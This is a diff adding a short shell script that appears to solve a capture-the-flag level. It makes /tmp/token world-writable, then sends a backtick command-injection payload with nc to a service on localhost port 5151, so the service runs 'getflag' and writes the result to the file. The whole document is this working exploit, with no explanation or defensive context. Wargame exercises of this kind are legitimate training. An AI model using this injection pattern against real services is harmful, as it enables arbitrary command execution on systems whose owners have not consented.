@@ -1,0 +1,4 @@
+#!/bin/sh
+touch /tmp/token
+chmod 777 /tmp/token
+echo $'`echo $(getflag)>/tmp/token`'|nc localhost 5151
